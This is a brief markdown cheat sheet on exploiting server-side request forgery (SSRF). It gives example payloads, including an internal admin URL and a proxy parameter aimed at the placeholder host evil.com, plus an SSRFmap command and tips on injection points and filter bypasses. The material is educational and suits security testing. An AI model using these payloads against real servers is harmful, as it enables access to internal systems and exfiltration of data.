# üåê SSRF (Server-Side Request Forgery) Exploitation

## Overview
SSRF exploitation involves leveraging vulnerabilities to make unauthorized requests from the server on behalf of the attacker.

## Example Payloads
1. Internal URL request:
    ```bash
    http://internal-server/admin
    ```
2. External URL request:
    ```bash
    http://example.com/proxy?url=http://evil.com
    ```

## Interactive Example
1. Test a vulnerable web application by inputting the payloads into URL parameters or form fields.
2. Observe the server's responses to confirm unauthorized requests.

## Tools
- **SSRFmap** for automated SSRF testing:
    ```bash
    python3 ssrfmap.py -u "http://example.com/vulnerable?param=value" -p param
    ```

## Tips
- Observe server responses to confirm unauthorized requests.
- Test in URL parameters, form fields, headers.
- Use bypass techniques for restricted URLs.

## Real-World Scenarios
- Accessing internal systems and services.
- Exfiltrating sensitive data from backend systems.
